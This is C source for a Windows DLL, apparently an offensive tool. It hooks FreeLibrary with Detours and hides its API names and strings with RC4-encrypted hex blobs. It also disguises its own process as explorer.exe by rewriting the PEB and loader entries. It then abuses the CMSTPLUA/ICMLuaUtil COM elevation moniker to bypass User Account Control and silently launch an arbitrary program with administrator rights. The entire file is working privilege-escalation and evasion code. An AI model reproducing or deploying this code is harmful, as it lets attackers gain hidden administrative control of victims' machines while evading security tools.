#include "header.h"
VOID WINAPI myCode(_In_ HMODULE hLibModule) {
	LPWSTR* szArglist;
	int nArgs;
	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
	if (NULL == szArglist){return;}

	BYTE Part2Info[Part1Len + 1] = { 0 };//Part1Len+1   
	BYTE* nameSrc = (BYTE*)Part1;
	SSDeal(Part2Info, nameSrc, Part1Len + 1);
	BYTE s[256] = { 0 };
	cryptInit(s, (BYTE*)SKey, (unsigned long)strlen(SKey));
	crypt(s, Part2Info, Part1Len + 1);
	BYTE name1[Part1Len1 + 1] = { 0 };//ntdll.dll
	BYTE name2[Part1Len2 + 1] = { 0 };//NtAllocateVirtualMemory
	BYTE name3[Part1Len3 + 1] = { 0 };//RtlEnterCriticalSection
	BYTE name4[Part1Len4 + 1] = { 0 };//RtlInitUnicodeString
	BYTE name5[Part1Len5 + 1] = { 0 };//RtlLeaveCriticalSection
	BYTE name6[Part1Len6 + 1] = { 0 };//LdrEnumerateLoadedModules
	memcpy(name1, Part2Info, Part1Len1);
	memcpy(name2, Part2Info + Part1Len1, Part1Len2);
	memcpy(name3, Part2Info + Part1Len1 + Part1Len2, Part1Len3);
	memcpy(name4, Part2Info + Part1Len1 + Part1Len2 + Part1Len3, Part1Len4);
	memcpy(name5, Part2Info + Part1Len1 + Part1Len2 + Part1Len3 + Part1Len4, Part1Len5);
	memcpy(name6, Part2Info + Part1Len1 + Part1Len2 + Part1Len3 + Part1Len4 + Part1Len5, Part1Len6);


	HMODULE Handler = GetModuleHandleA((LPCSTR)name1);
	if (Handler) {
		NtAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(Handler, (LPCSTR)name2);
		RtlEnterCriticalSection = (LPRTLENTERCRITICALSECTION)GetProcAddress(Handler, (LPCSTR)name3);
		RtlInitUnicodeString = (LPRTLINITUNICODESTRING)GetProcAddress(Handler, (LPCSTR)name4);
		RtlLeaveCriticalSection = (LPRTLLEAVECRITICALSECTION)GetProcAddress(Handler, (LPCSTR)name5);
		LdrEnumerateLoadedModules = (LPLDRENUMERATELOADEDMODULES)GetProcAddress(Handler, (LPCSTR)name6);
		supMasqueradeProcess();
		if (nArgs == 2)
			CMLuaUtilBypassUAC(szArglist[1], NULL);
		else if (nArgs == 3)
		    CMLuaUtilBypassUAC(szArglist[1], szArglist[2]);

	}
	ExitProcess(1);
}
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {
	if (dwReason == DLL_PROCESS_ATTACH) {
		DisableThreadLibraryCalls(hinst);

		DetourRestoreAfterWith();
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourAttach(&(PVOID&)old_FreeLibrary, myCode);
		DetourTransactionCommit();
	}
	else if (dwReason == DLL_PROCESS_DETACH) {
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourDetach(&(PVOID&)old_FreeLibrary, myCode);
		DetourTransactionCommit();
	}
	return TRUE;
}

VOID NTAPI supxLdrEnumModulesCallback(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _In_ PVOID Context, _Inout_ BOOLEAN* StopEnumeration)
{
	PPEB Peb = (PPEB)Context;

	if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
		RtlInitUnicodeString(&DataTableEntry->FullDllName, (LPWSTR)Part1Deal(1));
		RtlInitUnicodeString(&DataTableEntry->BaseDllName, Part1Deal(2));
		*StopEnumeration = TRUE;
	}
	else {
		*StopEnumeration = FALSE;
	}
}
__inline struct _PEB* NtCurrentPeb() { return NtCurrentTeb()->ProcessEnvironmentBlock; }
VOID supMasqueradeProcess(VOID)
{

	NTSTATUS Status;
	PPEB    Peb = NtCurrentPeb();
	SIZE_T  RegionSize;

	PVOID g_lpszExplorer = NULL;
	RegionSize = 0x1000;

	Status = NtAllocateVirtualMemory(
		NtCurrentProcess(),
		&g_lpszExplorer,
		0,
		&RegionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (NT_SUCCESS(Status)) {
		RtlEnterCriticalSection(Peb->FastPebLock);

		RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, (LPWSTR)Part1Deal(1));
		RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, (LPWSTR)Part1Deal(1));

		RtlLeaveCriticalSection(Peb->FastPebLock);

		LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, (PVOID)Peb);
	}
}
HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void** ppv)
{

	BIND_OPTS3 bo;
	WCHAR  wszCLSID[50];
	WCHAR  wszMonikerName[300];
	CoInitialize(NULL);
	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID) / sizeof(wszCLSID[0]));
	HRESULT hr = StringCchPrintfW(wszMonikerName, sizeof(wszMonikerName) / sizeof(wszMonikerName[0]), Part1Deal(3), wszCLSID);
	if (FAILED(hr))
		return hr;

	memset(&bo, 0, sizeof(bo));

	bo.cbStruct = sizeof(bo);
	bo.hwnd = hwnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;

	return CoGetObject(wszMonikerName, &bo, riid, ppv);
}
BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable, LPWSTR Parms)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil* CMLuaUtil = NULL;
	BOOL bRet = FALSE;


	CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
	IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

	CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
	hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, Parms, NULL, 0, SW_HIDE);

	CMLuaUtil->lpVtbl->Release(CMLuaUtil);

	if (GetLastError())
	{
		return FALSE;
	}
	else {
		return TRUE;
	}
}
void cryptInit(BYTE* s, BYTE* key, unsigned long Len)
{
	int i = 0, j = 0;
	BYTE k[256] = { 0 };
	BYTE tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = key[i % Len];
	}
	for (i = 0; i < 256; i++)//打乱s
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];//交换s[i]和s[j]
		s[j] = tmp;
	}
}
void crypt(BYTE* s, BYTE* Data, unsigned long Len)
{
	int i = 0, j = 0, t = 0;
	unsigned long k = 0;
	BYTE tmp;
	for (k = 0; k < Len; k++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];//交换s[x]和s[y]
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		Data[k] ^= s[t];
	}
}
void SSDeal(BYTE* pbDest, BYTE* pbSrc, int nLen)
{
	char h1, h2;
	BYTE s1, s2;
	int i;
	for (i = 0; i < nLen; i++)
	{
		h1 = pbSrc[2 * i];
		h2 = pbSrc[2 * i + 1];

		s1 = toupper(h1) - 0x30;
		if (s1 > 9)
			s1 -= 7;

		s2 = toupper(h2) - 0x30;
		if (s2 > 9)
			s2 -= 7;

		pbDest[i] = s1 * 16 + s2;
	}
}
TCHAR* Part1Deal(DWORD num) {
	BYTE Part1Info[Part1Len + 1] = { 0 };//Part1长度+1   
	BYTE* nameSrc = (BYTE*)Part1;
	SSDeal(Part1Info, nameSrc, Part1Len + 1);
	BYTE s[256] = { 0 };
	cryptInit(s, (BYTE*)SKey, (unsigned long)strlen(SKey));
	crypt(s, Part1Info, Part1Len + 1);
	if (num == 1) {
		CHAR srcName[Part1Len7 + 1] = { 0 };//C:\windows\explorer.exe
		memcpy(srcName, Part1Info + Part1Len1 + Part1Len2 + Part1Len3 + Part1Len4 + Part1Len5 + Part1Len6, Part1Len7);
		TCHAR* Name = (TCHAR*)calloc(80, 1); //转换成宽字节
		int Length = MultiByteToWideChar(CP_ACP, 0, srcName, sizeof(srcName), NULL, 0);
		MultiByteToWideChar(CP_ACP, 0, srcName, sizeof(srcName), Name, Length);
		return Name;
	}
	else if (num == 2) {
		CHAR srcName[Part1Len8 + 1] = { 0 };//explorer.exe
		memcpy(srcName, Part1Info + Part1Len1 + Part1Len2 + Part1Len3 + Part1Len4 + Part1Len5 + Part1Len6 + Part1Len7, Part1Len8);
		TCHAR* Name = (TCHAR*)calloc(40, 1); //转换成宽字节
		int Length = MultiByteToWideChar(CP_ACP, 0, srcName, sizeof(srcName), NULL, 0);
		MultiByteToWideChar(CP_ACP, 0, srcName, sizeof(srcName), Name, Length);
		return Name;
	}
	else if (num == 3) {
		CHAR srcName[Part1Len9 + 1] = { 0 };//Elevation:Administrator!new:%s
		memcpy(srcName, Part1Info + Part1Len1 + Part1Len2 + Part1Len3 + Part1Len4 + Part1Len5 + Part1Len6 + Part1Len7 + Part1Len8, Part1Len9);
		TCHAR* Name = (TCHAR*)calloc(80, 1); //转换成宽字节
		int Length = MultiByteToWideChar(CP_ACP, 0, srcName, sizeof(srcName), NULL, 0);
		MultiByteToWideChar(CP_ACP, 0, srcName, sizeof(srcName), Name, Length);
		return Name;
	}
	else {
		return (TCHAR*)L" ";
	}
}


